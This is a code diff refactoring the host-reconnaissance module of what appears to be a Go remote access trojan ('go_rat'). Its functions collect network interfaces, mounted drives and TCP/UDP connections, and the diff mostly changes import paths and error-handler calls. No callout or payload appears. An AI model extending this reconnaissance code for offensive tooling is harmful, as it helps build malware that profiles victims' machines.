@@ -14,7 +14,9 @@ package Intel
 
 // import the libraries we need
 import (
+	"go_rat/pkg/shared_code/Core"
 	shared_code "go_rat/pkg/shared_code/Core"
+	"go_rat/pkg/shared_code/ErrorHandling"
 	"net"
 
 	// necessary for getting netowork information
@@ -52,7 +54,7 @@ func get_interfaces(intel_struct *shared_code.HostIntel) bool {
 	// Get all network interfaces
 	herp, derp := net.Interfaces()
 	if derp != nil {
-		shared_code.Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.Interfaces = herp
@@ -63,10 +65,10 @@ func get_interfaces(intel_struct *shared_code.HostIntel) bool {
 //https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/hardrives.go
 
 // GetDrives iterates through the alphabet to return a list of mounted drives
-func GetDrives(intel_struct *HostIntel) bool {
+func GetDrives(intel_struct *Core.HostIntel) bool {
 	herp, derp := disk.Partitions(true)
 	if derp != nil {
-		Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.DriveInformation = herp
@@ -76,12 +78,12 @@ func GetDrives(intel_struct *HostIntel) bool {
 // ToDo: add functions for IPv6 connections
 
 // GetTCPConnections returns a slice describing TCP connections
-func GetTCPConnections(intel_struct *HostIntel) bool {
+func GetTCPConnections(intel_struct *Core.HostIntel) bool {
 
 	// TCP sockets
 	herp, derp := netstat.TCPSocks(netstat.NoopFilter)
 	if derp != nil {
-		Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.TCPConnections = herp
@@ -89,11 +91,11 @@ func GetTCPConnections(intel_struct *HostIntel) bool {
 }
 
 // GetUDPConnections returns a slice describing UDP connections
-func GetUDPConnections(intel_struct *HostIntel) bool {
+func GetUDPConnections(intel_struct *Core.HostIntel) bool {
 	// UDP sockets
 	herp, derp := netstat.UDPSocks(netstat.NoopFilter)
 	if derp != nil {
-		Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.UDPConnections = herp
